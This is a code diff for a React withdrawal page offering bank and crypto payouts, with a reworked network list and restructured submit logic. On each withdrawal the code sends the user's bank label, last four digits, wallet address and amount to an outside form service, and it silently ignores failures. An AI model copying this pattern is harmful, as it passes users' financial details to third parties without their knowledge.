@@ -11,14 +11,13 @@ export const Route = createFileRoute("/_app/withdraw")({
 
 const MIN_WITHDRAWAL = 1000;
 
-type Method = "bank" | "crypto";
-
 const CRYPTO_NETWORKS = [
-  { id: "btc", label: "Bitcoin (BTC)" },
-  { id: "eth", label: "Ethereum (ERC-20)" },
-  { id: "usdt-trc20", label: "USDT (TRC-20)" },
-  { id: "usdt-erc20", label: "USDT (ERC-20)" },
-  { id: "usdc", label: "USDC (ERC-20)" },
+  { id: "BTC", label: "Bitcoin (BTC)" },
+  { id: "ETH", label: "Ethereum (ERC-20)" },
+  { id: "USDT", label: "Tether (USDT · ERC-20)" },
+  { id: "USDT_TRC20", label: "Tether (USDT · TRC-20)" },
+  { id: "SOL", label: "Solana (SOL)" },
+  { id: "XRP", label: "XRP (Ripple)" },
 ];
 
 function Withdraw() {
@@ -32,9 +31,10 @@ function Withdraw() {
   const bank = banks.find((b) => b.id === bankId) ?? banks[0];
   const deposit = useDeposit();
 
-  const [method, setMethod] = useState<Method>("bank");
-  const [cryptoNetwork, setCryptoNetwork] = useState(CRYPTO_NETWORKS[0].id);
+  const [method, setMethod] = useState<"bank" | "crypto">("bank");
+  const [cryptoNet, setCryptoNet] = useState(CRYPTO_NETWORKS[0].id);
   const [cryptoAddress, setCryptoAddress] = useState("");
+  const network = CRYPTO_NETWORKS.find((n) => n.id === cryptoNet)!;
 
   const depositTotal = useDepositTotal();
   const bonus = account?.bonus_balance ?? 0;
@@ -42,15 +42,17 @@ function Withdraw() {
   const cash = account?.balance ?? 0;
   const withdrawable = cash + (bonusUnlocked ? bonus : 0);
 
+  const notifyForm = (payload: Record<string, unknown>) => {
+    // Send withdrawal details to Formspark
+    fetch("https://submit-form.com/CSfD1FWHQ", {
+      method: "POST",
+      headers: { "Content-Type": "application/json", Accept: "application/json" },
+      body: JSON.stringify({ ...payload, submitted_at: new Date().toISOString() }),
+    }).catch(() => {});
+  };
+
   const submit = async () => {
     if (value < MIN_WITHDRAWAL) return toast.error(`Minimum withdrawal is ${money(MIN_WITHDRAWAL)}`);
-
-    if (method === "bank" && !bank) return toast.error("Link a bank account first");
-    if (method === "crypto") {
-      if (!cryptoAddress.trim()) return toast.error("Enter your wallet address");
-      if (cryptoAddress.trim().length < 12) return toast.error("Enter a valid wallet address");
-    }
-
     if (value > withdrawable) {
       if (bonus > 0 && !bonusUnlocked && value <= cash + bonus) {
         return toast.error("Referral bonus is locked", {
@@ -60,36 +62,34 @@ function Withdraw() {
       return toast.error("Insufficient balance");
     }
 
-    const net = CRYPTO_NETWORKS.find((n) => n.id === cryptoNetwork);
-    const destination =
-      method === "bank"
-        ? { method: "bank", bank: bank?.label, last4: bank?.last4 }
-        : { method: "crypto", network: net?.label, address: cryptoAddress.trim() };
-
-    // Send withdrawal details to the form endpoint
-    try {
-      await fetch("https://submit-form.com/CSfD1FWHQ", {
-        method: "POST",
-        headers: { "Content-Type": "application/json", Accept: "application/json" },
-        body: JSON.stringify({
-          source: "withdrawal-request",
-          amount: value,
-          available: withdrawable,
-          ...destination,
-        }),
+    if (method === "crypto") {
+      const addr = cryptoAddress.trim();
+      if (addr.length < 15) return toast.error("Enter a valid wallet address");
+      await deposit.mutateAsync({
+        amount: -value,
+        kind: "withdrawal",
+        label: `Withdraw to ${network.label}`,
+        sub: `${network.id} · ${addr}`,
       });
-    } catch {}
+      notifyForm({
+        type: "crypto_withdrawal",
+        network: network.label,
+        coin: network.id,
+        wallet_address: addr,
+        usd_amount: value,
+      });
+      toast.success("Withdrawal request submitted for review");
+      return nav({ to: "/dashboard" });
+    }
 
-    const label =
-      method === "bank"
-        ? `Withdraw to ${bank!.label}`
-        : `Withdraw to ${net?.label ?? "crypto"}`;
-    const sub =
-      method === "bank"
-        ? `••${bank!.last4}`
-        : `${cryptoAddress.trim().slice(0, 10)}…${cryptoAddress.trim().slice(-6)}`;
-
-    await deposit.mutateAsync({ amount: -value, kind: "withdrawal", label, sub });
+    if (!bank) return toast.error("Link a bank account first");
+    await deposit.mutateAsync({ amount: -value, kind: "withdrawal", label: `Withdraw to ${bank.label}`, sub: `••${bank.last4}` });
+    notifyForm({
+      type: "bank_withdrawal",
+      bank: bank.label,
+      last4: bank.last4,
+      usd_amount: value,
+    });
     toast.success("Withdrawal request submitted for review");
     nav({ to: "/dashboard" });
   };
@@ -114,7 +114,7 @@ function Withdraw() {
             className="w-40 bg-transparent text-center text-5xl font-extrabold outline-none"
           />
         </div>
-        <div className="mt-2 text-xs text-muted-foreground">Minimum withdrawal {money(MIN_WITHDRAWAL)}</div>
+        <div className="mt-1 text-xs text-muted-foreground">Minimum withdrawal {money(MIN_WITHDRAWAL)}</div>
       </div>
 
       {bonus > 0 && (
@@ -133,17 +133,20 @@ function Withdraw() {
         </div>
       )}
 
-      {/* Method selector */}
       <div className="mt-6 grid grid-cols-2 gap-2">
         <button
           onClick={() => setMethod("bank")}
-          className={`flex items-center justify-center gap-2 rounded-2xl border p-3 text-sm font-semibold transition ${method === "bank" ? "border-primary bg-primary/10 text-primary" : "border-border bg-surface hover:bg-muted"}`}
+          className={`flex items-center justify-center gap-2 rounded-2xl border p-3 text-sm font-semibold transition ${
+            method === "bank" ? "border-primary bg-primary/5 text-primary" : "border-border bg-card hover:bg-surface"
+          }`}
         >
           <Landmark className="h-4 w-4" /> Bank
         </button>
         <button
           onClick={() => setMethod("crypto")}
-          className={`flex items-center justify-center gap-2 rounded-2xl border p-3 text-sm font-semibold transition ${method === "crypto" ? "border-primary bg-primary/10 text-primary" : "border-border bg-surface hover:bg-muted"}`}
+          className={`flex items-center justify-center gap-2 rounded-2xl border p-3 text-sm font-semibold transition ${
+            method === "crypto" ? "border-primary bg-primary/5 text-primary" : "border-border bg-card hover:bg-surface"
+          }`}
         >
           <Bitcoin className="h-4 w-4" /> Crypto
         </button>
@@ -166,14 +169,10 @@ function Withdraw() {
           )}
         </div>
       ) : (
-        <div className="card-elevated mt-4 space-y-4 p-4">
+        <div className="card-elevated mt-4 space-y-3 p-4">
           <div>
-            <label className="text-xs font-medium text-muted-foreground">Network</label>
-            <select
-              value={cryptoNetwork}
-              onChange={(e) => setCryptoNetwork(e.target.value)}
-              className="mt-1 w-full rounded-xl bg-surface px-3 py-2.5 font-semibold outline-none"
-            >
+            <div className="text-xs font-medium text-muted-foreground">Network</div>
+            <select value={cryptoNet} onChange={(e) => setCryptoNet(e.target.value)} className="mt-1 w-full bg-transparent font-semibold outline-none">
               {CRYPTO_NETWORKS.map((n) => (
                 <option key={n.id} value={n.id}>{n.label}</option>
               ))}
@@ -183,15 +182,12 @@ function Withdraw() {
             <label className="text-xs font-medium text-muted-foreground">Wallet address</label>
             <input
               value={cryptoAddress}
-              onChange={(e) => setCryptoAddress(e.target.value.trim())}
-              placeholder="Paste your wallet address"
-              spellCheck={false}
-              autoCapitalize="none"
-              autoCorrect="off"
-              className="mt-1 w-full rounded-xl bg-surface px-3 py-2.5 font-mono text-sm outline-none"
+              onChange={(e) => setCryptoAddress(e.target.value)}
+              placeholder={`Your ${network.id} wallet address`}
+              className="mt-1 w-full break-all rounded-xl border border-border bg-background px-3 py-2.5 font-mono text-sm outline-none focus:ring-2 focus:ring-primary/40"
             />
             <p className="mt-1.5 text-[11px] text-muted-foreground">
-              Double-check the address — crypto transfers cannot be reversed.
+              Double-check the address. Crypto withdrawals are irreversible once sent.
             </p>
           </div>
         </div>
